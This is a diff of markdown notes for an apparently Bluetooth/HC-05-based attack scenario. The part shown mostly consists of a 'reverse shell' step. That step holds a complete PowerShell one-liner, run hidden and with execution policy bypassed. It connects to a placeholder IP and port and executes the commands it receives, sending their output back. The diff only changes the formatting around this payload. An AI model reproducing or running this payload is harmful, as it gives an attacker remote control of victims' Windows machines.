@@ -155,6 +155,8 @@ scenario #1
 
 1. Bluetooth Adapter
 2. Arduino + HC-05
+
+
 ```
 char c = 'a';
 
@@ -171,10 +173,11 @@ void loop() {
 }
 
 ```
+
 3. reverse shell
 
 ```
-`powershell -NoP -NonI -W Hidden -Exec Bypass -Command New-Object System.Net.Sockets.TCPClient("IP_address",port);$stream=(New-Object System.IO.StreamReader((New-Object System.Net.Sockets.TCPClient("IP_address",port)).GetStream()));[byte[]]$bytes=0..65535|%{0};while(($i=$stream.BaseStream.Read($bytes,0,$bytes.Length)) -ne 0){;$data=(New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0,$i);$sendback=(iex $data 2>&1 | Out-String );$sendback2=$sendback + "PS " + (pwd).Path + "> ";$sendbyte=([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()}`
+powershell -NoP -NonI -W Hidden -Exec Bypass -Command New-Object System.Net.Sockets.TCPClient("IP_address",port);$stream=(New-Object System.IO.StreamReader((New-Object System.Net.Sockets.TCPClient("IP_address",port)).GetStream()));[byte[]]$bytes=0..65535|%{0};while(($i=$stream.BaseStream.Read($bytes,0,$bytes.Length)) -ne 0){;$data=(New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0,$i);$sendback=(iex $data 2>&1 | Out-String );$sendback2=$sendback + "PS " + (pwd).Path + "> ";$sendbyte=([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()}
 ```
 
 
